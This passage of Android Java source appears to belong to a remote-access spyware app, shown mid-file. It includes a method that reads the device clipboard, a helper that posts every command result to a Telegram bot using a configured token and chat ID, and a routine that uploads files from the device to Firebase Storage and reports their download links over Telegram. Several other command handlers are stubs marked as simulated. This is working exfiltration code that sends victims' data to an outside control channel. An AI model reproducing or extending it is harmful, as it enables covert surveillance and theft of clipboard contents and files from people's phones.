    private void getClipboard() { android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE); if (clipboard.hasPrimaryClip()) { String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString(); sendResult("CLIPBOARD_GET", "📋 Clipboard: " + text); sendToTelegram("📋 Clipboard:\n" + text); } else { sendResult("CLIPBOARD_GET", "📋 Empty"); } }
    private void copyResult() { sendResult("COPY", "📋 Copied (sim)"); sendToTelegram("📋 Copied"); }
    private void shareResult() { sendResult("SHARE", "📤 Shared (sim)"); sendToTelegram("📤 Shared"); }
    private void saveResult() { sendResult("SAVE", "💾 Saved (sim)"); sendToTelegram("💾 Saved"); }
    private void deleteResult() { sendResult("DELETE", "❌ Deleted (sim)"); sendToTelegram("❌ Deleted"); }
    private void getLogs() { sendResult("LOGS", "📜 Logs retrieved (sim)"); sendToTelegram("📜 Logs retrieved"); }
    private void sendToTelegram() { sendToTelegram("✅ Command executed successfully"); }

    // ============================================================
    //  UTILITY: SEND RESULT (FIREBASE + TELEGRAM)
    // ============================================================
    private void sendResult(String commandType, String result) {
        try {
            dbRef.child("devices").child(deviceId).child("data").child(commandType).setValue(result);
            sendToTelegram("📊 [" + commandType + "]\n" + result);
        } catch (Exception e) {
            Log.e(TAG, "❌ sendResult error: " + e.getMessage());
        }
    }

    // ============================================================
    //  UTILITY: SEND TO TELEGRAM BOT
    // ============================================================
    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage";
                JSONObject json = new JSONObject();
                json.put("chat_id", Config.CHAT_ID);
                json.put("text", message);
                json.put("parse_mode", "HTML");
                RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json.toString());
                Request request = new Request.Builder().url(url).post(body).build();
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful()) Log.e(TAG, "❌ Telegram error: " + response.code());
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Telegram send error: " + e.getMessage());
            }
        }).start();
    }

    // ============================================================
    //  UTILITY: UPLOAD FILE TO FIREBASE STORAGE
    // ============================================================
    private void uploadFile(String filePath, String type) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return;
            Uri fileUri = Uri.fromFile(file);
            StorageReference ref = storageRef.child(Config.STORAGE_PATH + deviceId + "/" + file.getName());
            ref.putFile(fileUri).addOnSuccessListener(taskSnapshot -> {
                ref.getDownloadUrl().addOnSuccessListener(uri -> {
                    String downloadUrl = uri.toString();
                    dbRef.child("devices").child(deviceId).child("data").child(type + "_file").setValue(downloadUrl);
                    sendToTelegram("📁 File uploaded: " + downloadUrl);
                });
            }).addOnFailureListener(e -> Log.e(TAG, "❌ Upload failed: " + e.getMessage()));
        } catch (Exception e) {
            Log.e(TAG, "❌ Upload error: " + e.getMessage());
        }
    }
}
